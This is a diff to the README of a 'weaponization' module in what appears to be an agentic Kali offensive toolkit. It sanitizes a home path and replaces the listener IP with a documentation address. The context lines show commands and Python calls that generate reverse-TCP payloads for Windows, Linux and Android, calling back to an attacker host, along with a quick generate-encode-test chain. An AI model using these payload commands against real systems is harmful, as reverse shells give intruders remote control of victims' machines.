@@ -18,10 +18,10 @@ The Weaponization module provides comprehensive payload generation, encoding, ev
 ### Generate a Simple Payload
 
 ```bash
-cd /home/wez/stsgym-work/agentic_ai/kali_agent_v3/weaponization
+cd /home/user/agentic-ai/agentic_ai/kali_agent_v3/weaponization
 
 # Generate Windows reverse TCP payload
-python3 payload_generator.py --lhost 192.168.1.100 --lport 4444 \
+python3 payload_generator.py --lhost 192.0.2.100 --lport 4444 \
   --type reverse_tcp --format exe --platform windows
 ```
 
@@ -64,7 +64,7 @@ python3 testing_framework.py --test payload.exe --tests size_check hash_verifica
 # Quick weaponization (generate → encode → test)
 python3 weaponization_engine.py --quick \
   --name my_payload \
-  --lhost 192.168.1.100 \
+  --lhost 192.0.2.100 \
   --lport 4444 \
   --platform windows
 ```
@@ -103,7 +103,7 @@ generator = PayloadGenerator()
 platforms = [Platform.WINDOWS, Platform.LINUX, Platform.ANDROID]
 results = generator.generate_multi_platform(
     name='multi_payload',
-    lhost='192.168.1.100',
+    lhost='192.0.2.100',
     lport=4444,
     platforms=platforms
 )
@@ -245,7 +245,7 @@ engine = WeaponizationEngine()
 # Quick weaponization with defaults
 report = engine.quick_weaponize(
     name='my_payload',
-    lhost='192.168.1.100',
+    lhost='192.0.2.100',
     lport=4444,
     platform=Platform.WINDOWS
 )
@@ -268,7 +268,7 @@ engine = WeaponizationEngine()
 # Create custom job
 job = engine.create_job(
     name='advanced_payload',
-    lhost='192.168.1.100',
+    lhost='192.0.2.100',
     lport=8443,
     platform=Platform.WINDOWS,
     arch=Architecture.X64,
